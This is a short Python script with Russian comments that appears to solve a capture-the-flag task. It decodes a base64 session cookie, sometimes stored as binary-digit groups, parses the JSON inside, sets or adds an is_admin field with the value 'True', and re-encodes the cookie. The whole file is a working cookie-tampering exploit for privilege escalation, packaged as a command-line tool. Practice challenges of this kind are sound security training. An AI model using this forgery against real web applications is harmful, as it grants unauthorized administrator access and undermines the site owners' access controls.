#!/usr/bin/env python3
"""solve_cookie.py

Утилита для декодирования, модификации и повторного кодирования уязвимой cookie из задания.
"""

import base64
import json
import argparse
from typing import Optional


def decode_base64_to_text(b64: str) -> str:
    """Декодирует base64-строку. Возвращает текст.

    Если после base64-раскодирования получится последовательность байтов,
    представляющая собой ASCII-строку — возвращаем её.
    Если получится текст, где байты представлены как группы из 8 бит,
    разделённые пробелами — преобразуем каждую группу в символ.
    """
    raw = base64.b64decode(b64)

    # Попробуем как UTF-8
    try:
        text = raw.decode('utf-8')
    except UnicodeDecodeError:
        # Попробуем latin1 как fallback
        text = raw.decode('latin1')

    # Если текст выглядит как бинарные группы (только 0,1 и пробелы),
    # преобразуем группы в символы
    if all(c in '01 ' for c in text) and any(ch == ' ' for ch in text):
        parts = text.strip().split()
        try:
            chars = ''.join(chr(int(p, 2)) for p in parts)
            return chars
        except ValueError:
            # не смогли распарсить как бинарные группы — вернём исходный текст
            return text

    return text


def encode_text_to_base64(s: str) -> str:
    """Кодирует строку в base64 и возвращает результат (str)."""
    return base64.b64encode(s.encode('utf-8')).decode('ascii')


def text_to_binary_groups(s: str) -> str:
    """Преобразует строку в последовательность бинарных групп (8 бит) через пробел."""
    return ' '.join(format(ord(c), '08b') for c in s)


def try_parse_json(s: str) -> Optional[dict]:
    try:
        return json.loads(s)
    except json.JSONDecodeError:
        return None


def toggle_admin_in_b64(b64: str, use_binary_groups: bool = False) -> str:
    """Декодируем base64, пытаемся найти JSON и поменять is_admin на "True".

    Если use_binary_groups=True, то при возврате будем сначала переводить
    строку в бинарные группы и уже их кодировать в base64 (поддержка кейса,
    когда сервер хранил двоичные группы в качестве текста).
    """
    decoded = decode_base64_to_text(b64)
    obj = try_parse_json(decoded)

    if obj is None:
        raise ValueError("Decoded content is not valid JSON: %r" % decoded)

    # Меняем поле is_admin в JSON
    if 'is_admin' in obj:
        obj['is_admin'] = "True"
    else:
        # Если нет такого поля, добавим его
        obj['is_admin'] = "True"

    new_text = json.dumps(obj)

    if use_binary_groups:
        new_text = text_to_binary_groups(new_text)

    return encode_text_to_base64(new_text)


def main():
    p = argparse.ArgumentParser(description='Decode/modify/encode vulnerable cookie')
    p.add_argument('cookie', help='base64 cookie value')
    p.add_argument('--binary-groups', action='store_true', help='Return base64 of binary groups (each byte as 8-bit group)')
    args = p.parse_args()

    print('Decoded text:\n')
    try:
        dec = decode_base64_to_text(args.cookie)
        print(dec)
    except Exception as e:
        print('Error decoding:', e)
        return

    try:
        new = toggle_admin_in_b64(args.cookie, use_binary_groups=args.binary_groups)
        print('\nNew base64 cookie value:')
        print(new)
    except Exception as e:
        print('Error toggling admin:', e)


if __name__ == '__main__':
    main()
